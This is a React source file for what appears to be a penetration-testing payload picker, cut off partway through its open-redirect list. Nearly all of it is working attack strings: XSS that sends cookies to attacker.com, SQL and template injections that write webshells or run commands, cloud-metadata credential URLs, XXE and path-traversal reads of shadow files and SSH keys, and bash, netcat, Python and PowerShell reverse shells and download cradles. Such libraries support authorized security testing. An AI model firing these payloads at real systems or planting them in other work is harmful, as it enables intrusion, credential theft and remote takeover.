import { useState, useMemo } from 'react';
import { Copy, Link2, Crosshair, Search } from 'lucide-react';
import toast from 'react-hot-toast';

// platform: 'linux' | 'windows' | 'any' (default any)
const CATEGORIES = [
  {
    id: 'xss',
    label: 'XSS',
    description: 'Cross-Site Scripting',
    payloads: [
      { label: 'Basic script tag', value: '<script>alert(1)</script>' },
      { label: 'Img onerror', value: '"><img src=x onerror=alert(1)>' },
      { label: 'SVG onload', value: '<svg onload=alert(1)>' },
      { label: 'Body onload', value: '<body onload=alert(1)>' },
      { label: 'Attribute injection', value: '" onmouseover="alert(1)' },
      { label: 'JavaScript URI', value: 'javascript:alert(1)' },
      { label: 'iframe srcdoc', value: '<iframe srcdoc="<script>alert(1)</script>">' },
      { label: 'Input autofocus', value: '<input autofocus onfocus=alert(1)>' },
      { label: 'Details open', value: '<details open ontoggle=alert(1)>' },
      { label: 'Video src', value: '<video src=x onerror=alert(1)>' },
      { label: 'Template literal bypass', value: '${alert(1)}' },
      { label: 'Angular template', value: '{{constructor.constructor("alert(1)")()}}' },
      { label: 'Filter bypass (nested)', value: '<scr<script>ipt>alert(1)</scr</script>ipt>' },
      { label: 'Case bypass', value: '<ScRiPt>alert(1)</sCrIpT>' },
      { label: 'No parentheses', value: '<img src=x onerror=alert`1`>' },
      { label: 'DOM sink via hash', value: '#<img src=x onerror=alert(1)>' },
      { label: 'Polyglot', value: 'jaVasCript:/*-/*`/*`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//' },
      { label: 'Fetch exfil', value: '<script>fetch("https://attacker.com/?c="+document.cookie)</script>' },
      { label: 'XSS via SVG namespace', value: '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>' },
      { label: 'Stored via data URI', value: '<a href="data:text/html,<script>alert(1)</script>">click</a>' },
    ],
  },
  {
    id: 'sqli',
    label: 'SQLi',
    description: 'SQL Injection',
    payloads: [
      // Generic
      { label: 'Auth bypass (OR)', value: "' OR '1'='1", dbType: 'generic' },
      { label: 'Auth bypass (comment)', value: "admin'--", dbType: 'generic' },
      { label: 'Auth bypass (hash)', value: "admin'#", dbType: 'generic' },
      { label: 'Always true', value: "' OR 1=1--", dbType: 'generic' },
      { label: 'UNION 2 cols', value: "' UNION SELECT NULL,NULL--", dbType: 'generic' },
      { label: 'UNION 3 cols', value: "' UNION SELECT NULL,NULL,NULL--", dbType: 'generic' },
      { label: 'Boolean blind true', value: "' AND 1=1--", dbType: 'generic' },
      { label: 'Boolean blind false', value: "' AND 1=2--", dbType: 'generic' },
      { label: 'Subquery exfil', value: "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--", dbType: 'generic' },
      // MySQL
      { label: 'UNION version', value: "' UNION SELECT @@version,NULL--", dbType: 'mysql' },
      { label: 'Time-based SLEEP', value: "' AND SLEEP(5)--", dbType: 'mysql' },
      { label: 'Error EXTRACTVALUE', value: "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--", dbType: 'mysql' },
      { label: 'Error EXP', value: "' AND EXP(~(SELECT * FROM (SELECT version())x))--", dbType: 'mysql' },
      { label: 'Read file', value: "' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--", dbType: 'mysql', platform: 'linux' },
      { label: 'Write webshell', value: "' UNION SELECT '<?php system($_GET[\"cmd\"]);?>',NULL INTO OUTFILE '/var/www/html/shell.php'--", dbType: 'mysql', platform: 'linux' },
      { label: 'Dump users', value: "' UNION SELECT user,password FROM mysql.user--", dbType: 'mysql' },
      { label: 'List tables', value: "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--", dbType: 'mysql' },
      { label: 'Current DB', value: "' UNION SELECT database(),NULL--", dbType: 'mysql' },
      { label: 'Current user', value: "' UNION SELECT user(),NULL--", dbType: 'mysql' },
      { label: 'List columns', value: "' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--", dbType: 'mysql' },
      { label: 'Stacked query (if allowed)', value: "'; INSERT INTO users(username,password) VALUES('hax','hax')--", dbType: 'mysql' },
      // MSSQL
      { label: 'UNION version', value: "' UNION SELECT @@version,NULL--", dbType: 'mssql', platform: 'windows' },
      { label: 'Time-based WAITFOR', value: "'; WAITFOR DELAY '0:0:5'--", dbType: 'mssql', platform: 'windows' },
      { label: 'xp_cmdshell whoami', value: "'; EXEC xp_cmdshell('whoami')--", dbType: 'mssql', platform: 'windows' },
      { label: 'Enable xp_cmdshell', value: "'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--", dbType: 'mssql', platform: 'windows' },
      { label: 'OOB DNS xp_dirtree', value: "'; EXEC master..xp_dirtree '//attacker.com/a'--", dbType: 'mssql', platform: 'windows' },
      { label: 'Read file bulk insert', value: "'; CREATE TABLE tmp (data NVARCHAR(MAX)); BULK INSERT tmp FROM 'C:\\Windows\\win.ini'; SELECT TOP 1 data FROM tmp--", dbType: 'mssql', platform: 'windows' },
      { label: 'Linked server OOB', value: "'; SELECT * FROM OPENROWSET('SQLNCLI','server=attacker.com;uid=sa;pwd=x;','SELECT 1')--", dbType: 'mssql', platform: 'windows' },
      { label: 'Current user', value: "' UNION SELECT SYSTEM_USER,NULL--", dbType: 'mssql' },
      { label: 'List databases', value: "' UNION SELECT name,NULL FROM master..sysdatabases--", dbType: 'mssql' },
      { label: 'List tables', value: "' UNION SELECT table_name,NULL FROM information_schema.tables--", dbType: 'mssql' },
      { label: 'Error-based (convert)', value: "' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--", dbType: 'mssql' },
      { label: 'IS_SRVROLEMEMBER sysadmin', value: "' AND 1=(SELECT IS_SRVROLEMEMBER('sysadmin'))--", dbType: 'mssql' },
      // PostgreSQL
      { label: 'UNION version', value: "' UNION SELECT version(),NULL--", dbType: 'postgresql' },
      { label: 'Time-based pg_sleep', value: "'; SELECT pg_sleep(5)--", dbType: 'postgresql' },
      { label: 'COPY to file (write webshell)', value: "'; COPY (SELECT '<?php system($_GET[cmd]);?>') TO '/var/www/html/shell.php'--", dbType: 'postgresql', platform: 'linux' },
      { label: 'COPY from file (read)', value: "'; CREATE TABLE tmp(t TEXT); COPY tmp FROM '/etc/passwd'; SELECT * FROM tmp--", dbType: 'postgresql', platform: 'linux' },
      { label: 'RCE via COPY PROGRAM', value: "'; COPY cmd_exec FROM PROGRAM 'id'--", dbType: 'postgresql' },
      { label: 'List tables', value: "' UNION SELECT table_name,NULL FROM information_schema.tables--", dbType: 'postgresql' },
      { label: 'Current user', value: "' UNION SELECT current_user,NULL--", dbType: 'postgresql' },
      { label: 'Current DB', value: "' UNION SELECT current_database(),NULL--", dbType: 'postgresql' },
      { label: 'List schemas', value: "' UNION SELECT schema_name,NULL FROM information_schema.schemata--", dbType: 'postgresql' },
      { label: 'Error-based (cast)', value: "' AND 1=CAST((SELECT version()) AS int)--", dbType: 'postgresql' },
      { label: 'Large object read', value: "'; SELECT lo_import('/etc/passwd')--", dbType: 'postgresql', platform: 'linux' },
      // Oracle
      { label: 'UNION from DUAL', value: "' UNION SELECT NULL FROM DUAL--", dbType: 'oracle' },
      { label: 'UNION version', value: "' UNION SELECT banner,NULL FROM v$version--", dbType: 'oracle' },
      { label: 'UNION user list', value: "' UNION SELECT username,password FROM dba_users--", dbType: 'oracle' },
      { label: 'Time-based DBMS_PIPE', value: "' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('x',5)--", dbType: 'oracle' },
      { label: 'OOB UTL_HTTP', value: "' AND 1=UTL_HTTP.REQUEST('http://attacker.com/')--", dbType: 'oracle' },
      { label: 'OOB UTL_FILE read', value: "' UNION SELECT UTL_FILE.GET_LINE(UTL_FILE.FOPEN('/etc','passwd','R'),1) FROM DUAL--", dbType: 'oracle', platform: 'linux' },
      { label: 'List tables', value: "' UNION SELECT table_name,NULL FROM all_tables--", dbType: 'oracle' },
      { label: 'Current user', value: "' UNION SELECT user,NULL FROM DUAL--", dbType: 'oracle' },
      { label: 'Error-based (XMLType)', value: "' AND 1=XMLType('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM \"http://attacker.com/\"> %remote;]>')--", dbType: 'oracle' },
      // SQLite
      { label: 'List tables', value: "' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--", dbType: 'sqlite' },
      { label: 'Dump schema', value: "' UNION SELECT sql,NULL FROM sqlite_master--", dbType: 'sqlite' },
      { label: 'Read file (load_extension)', value: "' UNION SELECT load_extension('/tmp/evil.so'),NULL--", dbType: 'sqlite', platform: 'linux' },
      { label: 'SQLite version', value: "' UNION SELECT sqlite_version(),NULL--", dbType: 'sqlite' },
      { label: 'Boolean blind (substr)', value: "' AND SUBSTR((SELECT password FROM users LIMIT 1),1,1)='a'--", dbType: 'sqlite' },
      { label: 'Time-based (heavy query)', value: "' AND (SELECT COUNT(*) FROM sqlite_master a, sqlite_master b, sqlite_master c)>0--", dbType: 'sqlite' },
    ],
  },
  {
    id: 'ssrf',
    label: 'SSRF',
    description: 'Server-Side Request Forgery',
    payloads: [
      { label: 'Localhost HTTP', value: 'http://127.0.0.1/' },
      { label: 'Localhost alt', value: 'http://0.0.0.0/' },
      { label: 'IPv6 localhost', value: 'http://[::1]/' },
      { label: 'Decimal IP (127.0.0.1)', value: 'http://2130706433/' },
      { label: 'Octal IP (127.0.0.1)', value: 'http://0177.0.0.1/' },
      { label: 'URL encoded IP', value: 'http://%31%32%37%2e%30%2e%30%2e%31/' },
      { label: 'Hex IP (127.0.0.1)', value: 'http://0x7f000001/' },
      // Cloud metadata
      { label: '[AWS] Instance metadata', value: 'http://169.254.169.254/latest/meta-data/' },
      { label: '[AWS] IAM role name', value: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' },
      { label: '[AWS] IMDSv2 token', value: 'http://169.254.169.254/latest/api/token' },
      { label: '[AWS] User data', value: 'http://169.254.169.254/latest/user-data' },
      { label: '[GCP] Metadata root', value: 'http://metadata.google.internal/computeMetadata/v1/' },
      { label: '[GCP] Service account token', value: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' },
      { label: '[GCP] Project ID', value: 'http://metadata.google.internal/computeMetadata/v1/project/project-id' },
      { label: '[Azure] Instance metadata', value: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01' },
      { label: '[Azure] Access token', value: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' },
      { label: '[DigitalOcean] Metadata', value: 'http://169.254.169.254/metadata/v1.json' },
      { label: '[Alibaba] Metadata', value: 'http://100.100.100.200/latest/meta-data/' },
      // File protocol
      { label: '[Linux] file:///etc/passwd', value: 'file:///etc/passwd', platform: 'linux' },
      { label: '[Windows] file:///C:/Windows/win.ini', value: 'file:///C:/Windows/win.ini', platform: 'windows' },
      // Internal services
      { label: 'Internal port scan (SSH)', value: 'http://127.0.0.1:22/' },
      { label: 'Internal port scan (MySQL)', value: 'http://127.0.0.1:3306/' },
      { label: 'Internal port scan (Redis)', value: 'http://127.0.0.1:6379/' },
      { label: 'Internal port scan (Elasticsearch)', value: 'http://127.0.0.1:9200/' },
      { label: 'Internal port scan (Memcached)', value: 'http://127.0.0.1:11211/' },
      // Protocols
      { label: 'Dict (Redis INFO)', value: 'dict://127.0.0.1:6379/info' },
      { label: 'Gopher (Redis FLUSHALL)', value: 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a' },
      { label: 'FTP', value: 'ftp://127.0.0.1/' },
    ],
  },
  {
    id: 'ssti',
    label: 'SSTI',
    description: 'Server-Side Template Injection',
    payloads: [
      { label: 'Detection (Jinja2/Twig/Pebble)', value: '{{7*7}}' },
      { label: 'Detection (Freemarker/Spring)', value: '${7*7}' },
      { label: 'Detection (Twig check)', value: "{{7*'7'}}" },
      { label: 'Detection (Velocity/Mako)', value: '#set($x=7*7)$x' },
      // Jinja2 (Python/Linux most common)
      { label: '[Jinja2] Config dump', value: '{{config}}', platform: 'linux' },
      { label: '[Jinja2] OS RCE (id)', value: "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}", platform: 'linux' },
      { label: '[Jinja2] OS RCE (whoami — Win)', value: "{{config.__class__.__init__.__globals__['os'].popen('whoami').read()}}", platform: 'windows' },
      { label: '[Jinja2] RCE via subclass', value: "{{''.__class__.mro()[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0]}}", platform: 'linux' },
      { label: '[Jinja2] Read /etc/passwd', value: "{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}", platform: 'linux' },
      { label: '[Jinja2] Read win.ini', value: "{{''.__class__.__mro__[2].__subclasses__()[40]('C:\\\\Windows\\\\win.ini').read()}}", platform: 'windows' },
      // Twig (PHP)
      { label: '[Twig] RCE', value: "{{['id']|filter('system')}}", platform: 'linux' },
      { label: '[Twig] RCE (Win)', value: "{{['whoami']|filter('system')}}", platform: 'windows' },
      { label: '[Twig] RCE passthru', value: "{{['id']|filter('passthru')}}", platform: 'linux' },
      // Freemarker (Java)
      { label: '[Freemarker] RCE (Linux)', value: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}', platform: 'linux' },
      { label: '[Freemarker] RCE (Windows)', value: '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("whoami")}', platform: 'windows' },
      // Velocity (Java)
      { label: '[Velocity] RCE (Linux)', value: '#set($rt=$class.forName("java.lang.Runtime"))#set($pr=$rt.getRuntime().exec("id"))#set($is=$pr.getInputStream())#set($sc=$class.forName("java.util.Scanner"))#set($s=$sc.getDeclaredConstructors()[0])$s.setAccessible(true)#set($in=$s.newInstance($is))$in.useDelimiter("\\A").next()', platform: 'linux' },
      // Smarty (PHP)
      { label: '[Smarty] RCE', value: '{php}echo `id`;{/php}', platform: 'linux' },
      { label: '[Smarty] {system}', value: '{system("id")}', platform: 'linux' },
      // ERB (Ruby)
      { label: '[ERB] RCE (Linux)', value: '<%= `id` %>', platform: 'linux' },
      { label: '[ERB] RCE (Windows)', value: '<%= `whoami` %>', platform: 'windows' },
      // Pebble (Java)
      { label: '[Pebble] RCE', value: '{% set cmd = "id" %}{{ cmd }}' },
    ],
  },
  {
    id: 'xxe',
    label: 'XXE',
    description: 'XML External Entity',
    payloads: [
      { label: '[Linux] /etc/passwd', value: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>', platform: 'linux' },
      { label: '[Linux] /etc/shadow', value: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>', platform: 'linux' },
      { label: '[Linux] ~/.ssh/id_rsa', value: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///home/user/.ssh/id_rsa">]><root>&xxe;</root>', platform: 'linux' },
      { label: '[Linux] /proc/self/environ', value: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><root>&xxe;</root>', platform: 'linux' },
      { label: '[Windows] win.ini', value: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]><root>&xxe;</root>', platform: 'windows' },
      { label: '[Windows] SAM (repair)', value: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/Windows/repair/SAM">]><root>&xxe;</root>', platform: 'windows' },
      { label: '[Windows] web.config', value: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/inetpub/wwwroot/web.config">]><root>&xxe;</root>', platform: 'windows' },
      { label: '[Windows] hosts', value: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><root>&xxe;</root>', platform: 'windows' },
      { label: 'SSRF via XXE (AWS)', value: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><root>&xxe;</root>' },
      { label: 'OOB exfil (DTD)', value: '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd"> %ext;]><root/>' },
      { label: 'Parameter entity blind', value: '<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?x=%file;\'>">%eval;%exfil;', platform: 'linux' },
      { label: 'SVG XXE (Linux)', value: '<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><image xlink:href="file:///etc/passwd"/></svg>', platform: 'linux' },
      { label: 'Billion laughs DoS', value: '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><root>&lol2;</root>' },
    ],
  },
  {
    id: 'lfi',
    label: 'LFI / Path Traversal',
    description: 'Local File Inclusion & Directory Traversal',
    payloads: [
      // Traversal sequences
      { label: 'Basic traversal (Unix)', value: '../../etc/passwd', platform: 'linux' },
      { label: 'Deep traversal (Unix)', value: '../../../../../../../../../etc/passwd', platform: 'linux' },
      { label: 'Basic traversal (Windows)', value: '..\\..\\..\\windows\\win.ini', platform: 'windows' },
      { label: 'Deep traversal (Windows)', value: '..\\..\\..\\..\\..\\..\\windows\\win.ini', platform: 'windows' },
      { label: 'Null byte (old PHP)', value: '../../etc/passwd%00', platform: 'linux' },
      { label: 'URL encoded (Unix)', value: '%2e%2e%2f%2e%2e%2fetc%2fpasswd', platform: 'linux' },
      { label: 'Double URL encoded (Unix)', value: '%252e%252e%252f%252e%252e%252fetc%252fpasswd', platform: 'linux' },
      { label: 'Unicode encoded (Unix)', value: '..%c0%af..%c0%afetc%c0%afpasswd', platform: 'linux' },
      { label: 'Windows backslash encoded', value: '..%5c..%5c..%5cwindows%5csystem32%5cdrivers%5cetc%5chosts', platform: 'windows' },
      { label: 'Mixed slashes (Windows)', value: '..\\..\\..//windows/win.ini', platform: 'windows' },
      // PHP wrappers
      { label: '[PHP] filter base64 (index.php)', value: 'php://filter/convert.base64-encode/resource=index.php' },
      { label: '[PHP] filter rot13', value: 'php://filter/read=string.rot13/resource=index.php' },
      { label: '[PHP] input (POST body exec)', value: 'php://input' },
      { label: '[PHP] expect RCE', value: 'expect://id', platform: 'linux' },
      { label: '[PHP] data URI RCE', value: 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7Pz4=' },
      // Linux sensitive files
      { label: '[Linux] /etc/passwd', value: '/etc/passwd', platform: 'linux' },
      { label: '[Linux] /etc/shadow', value: '/etc/shadow', platform: 'linux' },
      { label: '[Linux] /etc/group', value: '/etc/group', platform: 'linux' },
      { label: '[Linux] /etc/hostname', value: '/etc/hostname', platform: 'linux' },
      { label: '[Linux] /etc/hosts', value: '/etc/hosts', platform: 'linux' },
      { label: '[Linux] /etc/resolv.conf', value: '/etc/resolv.conf', platform: 'linux' },
      { label: '[Linux] /etc/fstab', value: '/etc/fstab', platform: 'linux' },
      { label: '[Linux] /etc/crontab', value: '/etc/crontab', platform: 'linux' },
      { label: '[Linux] /etc/ssh/sshd_config', value: '/etc/ssh/sshd_config', platform: 'linux' },
      { label: '[Linux] /etc/ssh/ssh_config', value: '/etc/ssh/ssh_config', platform: 'linux' },
      { label: '[Linux] /root/.bash_history', value: '/root/.bash_history', platform: 'linux' },
      { label: '[Linux] /root/.ssh/id_rsa', value: '/root/.ssh/id_rsa', platform: 'linux' },
      { label: '[Linux] /root/.ssh/authorized_keys', value: '/root/.ssh/authorized_keys', platform: 'linux' },
      { label: '[Linux] /home/user/.bash_history', value: '/home/{user}/.bash_history', platform: 'linux' },
      { label: '[Linux] /home/user/.ssh/id_rsa', value: '/home/{user}/.ssh/id_rsa', platform: 'linux' },
      { label: '[Linux] ~/.aws/credentials', value: '/root/.aws/credentials', platform: 'linux' },
      { label: '[Linux] /proc/self/environ', value: '/proc/self/environ', platform: 'linux' },
      { label: '[Linux] /proc/self/cmdline', value: '/proc/self/cmdline', platform: 'linux' },
      { label: '[Linux] /proc/self/fd/0', value: '/proc/self/fd/0', platform: 'linux' },
      { label: '[Linux] /proc/net/tcp', value: '/proc/net/tcp', platform: 'linux' },
      { label: '[Linux] /proc/version', value: '/proc/version', platform: 'linux' },
      { label: '[Linux] /var/log/auth.log', value: '/var/log/auth.log', platform: 'linux' },
      { label: '[Linux] /var/log/syslog', value: '/var/log/syslog', platform: 'linux' },
      { label: '[Linux] /var/log/apache2/access.log', value: '/var/log/apache2/access.log', platform: 'linux' },
      { label: '[Linux] /var/log/apache2/error.log', value: '/var/log/apache2/error.log', platform: 'linux' },
      { label: '[Linux] /var/log/nginx/access.log', value: '/var/log/nginx/access.log', platform: 'linux' },
      { label: '[Linux] /var/log/nginx/error.log', value: '/var/log/nginx/error.log', platform: 'linux' },
      { label: '[Linux] /etc/apache2/apache2.conf', value: '/etc/apache2/apache2.conf', platform: 'linux' },
      { label: '[Linux] /etc/nginx/nginx.conf', value: '/etc/nginx/nginx.conf', platform: 'linux' },
      { label: '[Linux] /etc/mysql/my.cnf', value: '/etc/mysql/my.cnf', platform: 'linux' },
      { label: '[Linux] /var/log/mysql/error.log', value: '/var/log/mysql/error.log', platform: 'linux' },
      // Windows sensitive files
      { label: '[Windows] C:\\Windows\\win.ini', value: 'C:\\Windows\\win.ini', platform: 'windows' },
      { label: '[Windows] C:\\Windows\\system.ini', value: 'C:\\Windows\\system.ini', platform: 'windows' },
      { label: '[Windows] C:\\boot.ini', value: 'C:\\boot.ini', platform: 'windows' },
      { label: '[Windows] drivers\\etc\\hosts', value: 'C:\\Windows\\System32\\drivers\\etc\\hosts', platform: 'windows' },
      { label: '[Windows] repair\\SAM', value: 'C:\\Windows\\repair\\SAM', platform: 'windows' },
      { label: '[Windows] repair\\system', value: 'C:\\Windows\\repair\\system', platform: 'windows' },
      { label: '[Windows] repair\\security', value: 'C:\\Windows\\repair\\security', platform: 'windows' },
      { label: '[Windows] Panther\\Unattend.xml', value: 'C:\\Windows\\Panther\\Unattend.xml', platform: 'windows' },
      { label: '[Windows] Panther\\Unattended.xml', value: 'C:\\Windows\\Panther\\Unattended.xml', platform: 'windows' },
      { label: '[Windows] debug\\NetSetup.log', value: 'C:\\Windows\\debug\\NetSetup.log', platform: 'windows' },
      { label: '[Windows] inetpub\\web.config', value: 'C:\\inetpub\\wwwroot\\web.config', platform: 'windows' },
      { label: '[Windows] IIS logs', value: 'C:\\inetpub\\logs\\LogFiles\\', platform: 'windows' },
      { label: '[Windows] Administrator ssh key', value: 'C:\\Users\\Administrator\\.ssh\\id_rsa', platform: 'windows' },
      { label: '[Windows] Administrator AWS creds', value: 'C:\\Users\\Administrator\\.aws\\credentials', platform: 'windows' },
      { label: '[Windows] XAMPP php.ini', value: 'C:\\xampp\\php\\php.ini', platform: 'windows' },
      { label: '[Windows] XAMPP my.ini', value: 'C:\\xampp\\mysql\\bin\\my.ini', platform: 'windows' },
      { label: '[Windows] XAMPP httpd.conf', value: 'C:\\xampp\\apache\\conf\\httpd.conf', platform: 'windows' },
      { label: '[Windows] WAMP mysql my.ini', value: 'C:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini', platform: 'windows' },
      { label: '[Windows] WAMP httpd.conf', value: 'C:\\wamp\\bin\\apache\\apache2.4.9\\conf\\httpd.conf', platform: 'windows' },
      { label: '[Windows] MySQL my.ini', value: 'C:\\ProgramData\\MySQL\\MySQL Server 5.5\\my.ini', platform: 'windows' },
      { label: '[Windows] AppServ httpd.conf', value: 'C:\\AppServ\\Apache\\conf\\httpd.conf', platform: 'windows' },
    ],
  },
  {
    id: 'cmdi',
    label: 'Command Injection',
    description: 'OS Command Injection',
    payloads: [
      // Universal separators
      { label: 'Semicolon separator', value: '; id' },
      { label: 'Pipe', value: '| id' },
      { label: 'Double pipe (OR)', value: '|| id' },
      { label: 'Ampersand (background)', value: '& id' },
      { label: 'Double ampersand (AND)', value: '&& id' },
      { label: 'Newline', value: '%0aid' },
      // Linux recon
      { label: '[Linux] id', value: '; id', platform: 'linux' },
      { label: '[Linux] whoami', value: '; whoami', platform: 'linux' },
      { label: '[Linux] uname -a', value: '; uname -a', platform: 'linux' },
      { label: '[Linux] cat /etc/passwd', value: '; cat /etc/passwd', platform: 'linux' },
      { label: '[Linux] cat /etc/shadow', value: '; cat /etc/shadow', platform: 'linux' },
      { label: '[Linux] env', value: '; env', platform: 'linux' },
      { label: '[Linux] ifconfig/ip a', value: '; ip a', platform: 'linux' },
      { label: '[Linux] netstat -ant', value: '; netstat -ant', platform: 'linux' },
      { label: '[Linux] ps aux', value: '; ps aux', platform: 'linux' },
      { label: '[Linux] ls -la /', value: '; ls -la /', platform: 'linux' },
      { label: '[Linux] crontab -l', value: '; crontab -l', platform: 'linux' },
      // Linux reverse shells
      { label: '[Linux] Bash reverse shell', value: '; bash -i >& /dev/tcp/attacker.com/4444 0>&1', platform: 'linux' },
      { label: '[Linux] Python reverse shell', value: "; python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'", platform: 'linux' },
      { label: '[Linux] Netcat reverse shell', value: '; nc -e /bin/sh attacker.com 4444', platform: 'linux' },
      { label: '[Linux] Netcat (no -e)', value: '; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f', platform: 'linux' },
      // Linux blind
      { label: '[Linux] Blind sleep', value: '; sleep 5', platform: 'linux' },
      { label: '[Linux] Blind curl OOB', value: '; curl http://attacker.com/$(id|base64)', platform: 'linux' },
      { label: '[Linux] Blind DNS OOB', value: '; ping -c 1 $(whoami).attacker.com', platform: 'linux' },
      { label: '[Linux] Write webshell', value: '; echo "<?php system($_GET[cmd]);?>" > /var/www/html/shell.php', platform: 'linux' },
      // Linux bypass
      { label: '[Linux] Backtick substitution', value: '`id`', platform: 'linux' },
      { label: '[Linux] $() substitution', value: '$(id)', platform: 'linux' },
      { label: '[Linux] IFS bypass', value: 'id$IFS', platform: 'linux' },
      { label: '[Linux] Glob bypass', value: '/bin/c?t /etc/passwd', platform: 'linux' },
      { label: '[Linux] Brace expansion bypass', value: '/bin/{cat,} /etc/passwd', platform: 'linux' },
      { label: '[Linux] Env var bypass', value: '$IFS$9id', platform: 'linux' },
      // Windows recon
      { label: '[Windows] whoami', value: '& whoami', platform: 'windows' },
      { label: '[Windows] whoami /all (groups + privs)', value: '& whoami /all', platform: 'windows' },
      { label: '[Windows] systeminfo', value: '& systeminfo', platform: 'windows' },
      { label: '[Windows] ipconfig /all', value: '& ipconfig /all', platform: 'windows' },
      { label: '[Windows] net user', value: '& net user', platform: 'windows' },
      { label: '[Windows] net localgroup administrators', value: '& net localgroup administrators', platform: 'windows' },
      { label: '[Windows] net view', value: '& net view', platform: 'windows' },
      { label: '[Windows] dir C:\\', value: '& dir C:\\', platform: 'windows' },
      { label: '[Windows] type win.ini', value: '& type C:\\Windows\\win.ini', platform: 'windows' },
      { label: '[Windows] set (env vars)', value: '& set', platform: 'windows' },
      { label: '[Windows] tasklist', value: '& tasklist', platform: 'windows' },
      { label: '[Windows] netstat -ano', value: '& netstat -ano', platform: 'windows' },
      { label: '[Windows] reg SAM hive', value: '& reg save HKLM\\SAM C:\\Temp\\sam.hive', platform: 'windows' },
      // Windows PowerShell
      { label: '[Windows] PowerShell whoami', value: '& powershell -c whoami', platform: 'windows' },
      { label: '[Windows] PowerShell encoded (calc)', value: '& powershell -enc YwBhAGwAYwA=', platform: 'windows' },
      { label: '[Windows] PowerShell IEX download', value: '& powershell -c "IEX(New-Object Net.WebClient).DownloadString(\'http://attacker.com/shell.ps1\')"', platform: 'windows' },
      { label: '[Windows] PowerShell reverse shell', value: '& powershell -nop -c "$client=New-Object System.Net.Sockets.TCPClient(\'attacker.com\',4444);$s=$client.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+\'PS \'+(pwd).Path+\'> \';$sb3=[System.Text.Encoding]::ASCII.GetBytes($sb2);$s.Write($sb3,0,$sb3.Length);$s.Flush()};$client.Close()"', platform: 'windows' },
      // Windows blind
      { label: '[Windows] Blind ping OOB', value: '& ping -n 1 attacker.com', platform: 'windows' },
      { label: '[Windows] Blind nslookup OOB', value: '& nslookup attacker.com', platform: 'windows' },
      { label: '[Windows] Blind certutil OOB', value: '& certutil -urlcache -split -f http://attacker.com/x C:\\Temp\\x', platform: 'windows' },
      { label: '[Windows] Blind bitsadmin', value: '& bitsadmin /transfer x http://attacker.com/x C:\\Temp\\x', platform: 'windows' },
    ],
  },
  {
    id: 'open_redirect',
    label: 'Open Redirect',
    description: 'Open Redirect & URL Manipulation',
    payloads: [
      { label: 'Protocol-relative', value: '//evil.com' },
      { label: 'Full URL', value: 'https://evil.com' },
      { label: 'Encoded double slash', value: '%2F%2Fevil.com' },
      { label: 'Triple slash', value: '///evil.com' },
      { label: 'Tab encoded', value: '/%09/evil.com' },
      { label: 'Newline encoded', value: '/%0d/evil.com' },
      { label: 'Backslash', value: '\\evil.com' },
      { label: 'Null byte bypass', value: '//evil.com%00.trusted.com' },
